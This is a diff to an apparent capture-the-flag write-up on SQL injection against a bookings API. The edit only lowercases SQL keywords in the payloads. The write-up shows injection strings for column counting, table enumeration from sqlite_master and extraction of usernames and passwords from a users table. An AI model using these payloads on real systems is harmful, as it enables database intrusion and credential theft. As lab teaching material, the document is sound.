@@ -115,8 +115,8 @@ GET /api/bookings?status=pending' OR 1=1-- HTTP/1.1
 ### Step 2: Determine Column Count
 Used ORDER BY to binary search for column count:
 ```sql
-' ORDER BY 26--   -- Works
-' ORDER BY 27--   -- Error
+' order by 26--   -- Works
+' order by 27--   -- Error
 ```
 **Result:** 26 columns confirmed.
 
@@ -151,13 +151,13 @@ Systematic testing revealed:
 Instead of using subselects or aggregate functions, make sqlite_master the FROM table for the entire UNION query:
 
 ```http
-GET /api/bookings?status=' UNION SELECT 1,2,...,17,name,19,...,26 FROM sqlite_master LIMIT 1-- HTTP/1.1
+GET /api/bookings?status=' union select 1,2,...,17,name,19,...,26 from sqlite_master limit 1-- HTTP/1.1
 ```
 **Result:** First table name returned. Iterated with `LIMIT 1 OFFSET N` to enumerate all tables. Discovered "users" table.
 
 ### Step 6: Extract Credentials and Flag
 ```http
-GET /api/bookings?status=' UNION SELECT 1,2,...,17,username,password,20,...,26 FROM users LIMIT 1 OFFSET 0-- HTTP/1.1
+GET /api/bookings?status=' union select 1,2,...,17,username,password,20,...,26 from users limit 1 offset 0-- HTTP/1.1
 ```
 
 **Response:**
